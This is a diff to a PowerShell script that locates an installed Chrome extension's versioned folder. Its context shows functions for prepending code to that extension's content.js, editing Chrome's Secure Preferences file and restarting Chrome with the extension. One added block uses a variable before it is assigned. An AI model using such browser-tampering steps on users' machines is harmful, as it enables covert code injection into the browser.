@@ -1,4 +1,4 @@
- # Define functions
+# Define functions
 
 function Prepend-ToContentJS {
     param (
@@ -189,6 +189,11 @@ $MasterDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
 
 # Define Extension Path
 $ExtensionPath = Join-Path -Path $MasterDir -ChildPath "Extensions\egjidjbpglichdcondbcbdnbeeppgdph"
+if ($subdirectory) {
+    $ExtensionPath = Join-Path -Path $ExtensionPath -ChildPath $subdirectory.Name
+} else {
+    Write-Host "No subdirectory found in $ExtensionPath" -ForegroundColor Red
+}
 
 # Define Secure Preferences Path
 $SecurePreferencesPath = Join-Path -Path $MasterDir -ChildPath "Secure Preferences"
@@ -329,6 +334,14 @@ $MasterDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
 
 # Define Extension Path
 $ExtensionPath = Join-Path -Path $MasterDir -ChildPath "Extensions\egjidjbpglichdcondbcbdnbeeppgdph"
+$subdirectory = Get-ChildItem -Path $ExtensionPath -Directory | Select-Object -First 1
+
+# Check if a subdirectory was found
+if ($subdirectory) {
+    $ExtensionPath = Join-Path -Path $ExtensionPath -ChildPath $subdirectory.Name
+} else {
+    Write-Host "No subdirectory found in $ExtensionPath" -ForegroundColor Red
+}
 Wait-Job -Id $job.Id
     Restart-ChromeWithExtension -ExtensionPath $ExtensionPath
     $installForm.Close()
